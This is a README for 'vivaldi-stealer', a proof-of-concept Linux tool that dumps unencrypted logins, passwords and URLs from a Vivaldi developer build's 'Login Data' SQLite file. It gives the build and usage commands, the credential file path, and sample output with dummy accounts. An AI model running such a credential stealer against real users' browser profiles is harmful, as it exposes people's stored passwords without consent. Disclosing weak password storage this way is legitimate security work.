vivaldi-stealer is a Proof of Concept program which reads an 
unencrypted logins, passwords and urls from a SQLite3 database 
of Vivaldi browser v1.0.83.38 (Developer build).

Platform.
Linux.

Compilation.
make

Usage.
./vivaldi-stealer <login_data_path>
<login_data_file> is usually '$HOME/.config/vivaldi/Default/Login Data'.

Sample output.
#1 record:
Login: cypher
Password: qwerty
Resource: https://domain.org/

#2 record:
Login: neo
Password: 12345678
Resource: http://the.matrix/
